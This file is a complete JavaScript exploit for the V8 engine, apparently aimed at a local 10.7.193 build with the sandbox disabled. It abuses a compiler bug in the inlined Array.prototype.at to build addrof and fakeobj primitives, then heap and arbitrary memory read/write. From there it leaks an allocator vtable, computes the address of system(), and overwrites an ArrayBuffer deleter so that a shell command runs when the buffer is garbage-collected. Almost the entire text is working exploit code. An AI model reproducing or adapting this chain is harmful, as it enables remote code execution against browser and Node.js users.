/*
 * Constants.
 */
const kHeapObjTag = 0x1;
// This offset is build dependent. Get it e.g. via %DebugPrint([1.1, 2.2, 3.3]) or from a debugger by inspecting a packed double JSArray.
// Offset from a local 10.7.193 release build.
const kPackedDoubleJSArrayMap = 0x00203b01;
const kEmptyFixedArray = 0x00002251;


/*
 * Utility code.
 */
// Bitwise cast between integers and doubles.
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
let u64 = new BigUint64Array(f64.buffer);

function i2d(i) {
  u32[0] = i;
  u32[1] = 0;
  return f64[0];
}

function d2i(d) {
  f64[0] = d;
  return u32[0];
}

function d2bi(d) {
  f64[0] = d;
  return u64[0];
}

function bi2d(bi) {
  u64[0] = bi;
  return f64[0];
}

/*
 * Exploit primitives.
 */
function buildHeapReadWrite() {
  function makeFakeObjectContainer() {
    // Create two fake JSArrays with PACKED_DOUBLE storage, one having 0x0 as backing storage,
    // the other 0x4. This way, every 4-byte aligned QWORD can be accessed.
    let fakeFixedDoubleArrayContent = new Uint32Array([
      kPackedDoubleJSArrayMap,  // Map
      kEmptyFixedArray,         // Propeties
      1,                        // Elements
      0x20000000 << 1,          // Length
      kPackedDoubleJSArrayMap,  // Map
      kEmptyFixedArray,         // Propeties
      5,                        // Elements
      0x20000000 << 1,          // Length
    ]);
    let fakeFixedDoubleArrayBytes = new Uint8Array(fakeFixedDoubleArrayContent.buffer);
    let container = String.fromCharCode.apply(String, fakeFixedDoubleArrayBytes);

    // Move the container object to Old Space so it stays at a fixed position in memory.
    gc();
    gc();
    gc();

    return container;
  }

  function addrof(o) {
    function bug(a, i) {
      return a.at(i);
    }

    // Optimize function to trigger compiler bug. The inlined code for Array.prototype.at will only
    // perform a ElementKind check, not a Map check, so our fake array will pass the check.
    let not_array = { length: 0x1337, __proto__: Array.prototype, 1: 42 };    // JSObject with HOLEY_ELEMENTS kind
    let array = ["pwn",,"pwn",,"pwn"];                                        // JSArray with HOLEY_ELEMENTS kind
    for (let a = 0; a < 10000; a++) {
      bug(array, 0);
      bug(not_array, 0);
    }

    // Addrof implementation:
    //  1. Make the FixedArray backing our fake_arr's elements very large
    //  2. Set the object whose location in memory we wish to know as the length of our fake_arr
    //  3. Search for the first 'undefined' value using the bug. That will be the address of the object when treated as a Smi

    let fake_arr = not_array;
    fake_arr.length = o;
    let N = 0x200000;
    for (let i = 0; i < N; i++) {
      fake_arr[i] = i;
    }
    // TODO can do a binary search as optimization.
    for (let i = 0; i < N; i++) {
      if (bug(fake_arr, i) === undefined) {
        let addr = i << 1;
        return addr;
      }
    }

    throw "addrof failed";
  }

  function fakeobj(addr) {
    function bug(a, i) {
      return a.at(i);
    }

    // Optimize function to trigger compiler bug. The inlined code for Array.prototype.at will only
    // perform a ElementKind check, not a Map check, so our fake array will pass the check.
    let not_array = { length: 0x1337, __proto__: Array.prototype, 1: 42 };    // JSObject with HOLEY_ELEMENTS kind
    let array = ["pwn",,"pwn",,"pwn"];                                        // JSArray with HOLEY_ELEMENTS kind
    for (let a = 0; a < 10000; a++) {
      bug(array, 0);
      bug(not_array, 0);
    }

    // Fakeobj implementation:
    //  1. Get controlled PACKED_DOUBLE elements behind the fake array that we will access OOB
    //  2. Put a known marker value in the double array, then the address we wish to turn into an object
    //  3. Use the bug to access into the other array and search for the marker value. Once found, access the following value

    // Fill any existing holes in the heap.
    let arrays = [];
    for (let i = 0; i < 1000; i++) {
      arrays.push([i + 1.1, i + 2.2, i + 3.3]);
    }

    // Create the object that we will read OOB from.
    let o = { length: 1000, __proto__: Array.prototype, 1: 42 };

    // Create unboxed double JSArrays with a special marker value that we will search for afterwards.
    const kMarker = 31337;
    for (let i = 0; i < 100; i++) {
      let a = [i2d(i << 1), i2d(kMarker << 1), i2d(addr + kHeapObjTag)];
      arrays.push(a);
    }

    // Trigger the OOB read and search for the marker. The double value after that contains the address of the fake object.
    for (let i = 0; i < 1000; i++) {
      let x = bug(o, i);
      if (x === kMarker) {
        return bug(o, i + 2);
      }
    }

    throw "fakeobj failed";
  }

  let container = makeFakeObjectContainer();

  let container_addr = addrof(container);
  print("[+] Container @ 0x" + container_addr.toString(16));
  let fake_arr_0 = fakeobj(container_addr + 12);
  let fake_arr_4 = fakeobj(container_addr + 12 + 16);

  return {
    addrof(obj) {
      fake_arr_0.leakme = obj;
      let addr_of_backing_mem = d2i(this.readf64(container_addr + 12 + 4)) - kHeapObjTag;
      return d2i(this.readf64(addr_of_backing_mem + 8)) - kHeapObjTag;
    },

    readf64(offset) {
      offset -= 8;    // FixedArray header size
      if (offset % 8 == 0) {
        return fake_arr_0[offset / 8];
      } else if (offset % 8 == 4) {
        return fake_arr_4[(offset - 4) / 8];
      } else {
        throw "Can't read that";
      }
    },

    writef64(offset, value) {
      offset -= 8;    // FixedArray header size
      if (offset % 8 == 0) {
        fake_arr_0[offset / 8] = value;
      } else if (offset % 8 == 4) {
        fake_arr_4[(offset - 4) / 8] = value;
      } else {
        throw "Can't write that";
      }
    },
  };
}

function buildArbitraryReadWrite(heapview) {
  let memview = new BigUint64Array(100);

  // Move to Old Space
  gc();
  gc();
  gc();

  let memview_addr = heapview.addrof(memview);
  let backing_store_pointer_addr = memview_addr + 44;

  print("[+] BigUint64Array @ " + memview_addr.toString(16));
  print("[+] BigUint64Array backing store pointer @ " + backing_store_pointer_addr.toString(16));

  return {
    read64(addr) {
      heapview.writef64(backing_store_pointer_addr, bi2d(addr));
      return memview[0];
    },

    write64(addr, value) {
      heapview.writef64(backing_store_pointer_addr, bi2d(addr));
      memview[0] = value;
    },
  };
}

function pwn() {
  let heapview = buildHeapReadWrite();

  // Things should be stable right now
  gc();

  //
  // The next steps only work with v8_enable_sandbox=false
  //

  let memory = buildArbitraryReadWrite(heapview);

  // Things should be stable right now
  gc();

  // Should crash now:
  // memory.write64(0x414141414141n, 0x4242424242424242n);

  let ab = new ArrayBuffer(1024);
  let v = new Uint8Array(ab);
  let payload = "echo Hello V8";
  for (let i = 0; i < payload.length; i++) {
    v[i] = payload.charCodeAt(i);
  }

  let ab_addr = heapview.addrof(ab);
  print("ArrayBuffer @ " + ab_addr);
  let extension_address = d2bi(heapview.readf64(ab_addr + 36));

  print("ArrayBufferExtension @ 0x" + extension_address.toString(16));
  let backing_store_obj_addr = memory.read64(extension_address + 8n);
  // This should be the length
  // print(memory.read64(backing_store_obj_addr + 8n));

  let deleter_info_addr = backing_store_obj_addr + 40n;
  let array_buffer_allocator_addr = memory.read64(deleter_info_addr);
  let array_buffer_allocator_vtable_addr = memory.read64(array_buffer_allocator_addr);
  print("ArrayBufferAllocator vtable @ " + array_buffer_allocator_vtable_addr.toString(16));

  // memmove: 0x559F95630D18, vtable: 0x559f955c4978
  let memmove_got_addr = array_buffer_allocator_vtable_addr + 443296n;
  let memmove_addr = memory.read64(memmove_got_addr);
  print("memmov @ 0x" + memmove_addr.toString(16));

  // memmove: 0x7faf95554330, system: 0x7FAF9544A490
  let system_addr = memmove_addr - 1089184n;

  memory.write64(deleter_info_addr, system_addr);
  let bitset_addr = backing_store_obj_addr + 56n;
  memory.write64(bitset_addr, 1n << 7n);

  ab = null;
  gc();
}

pwn();
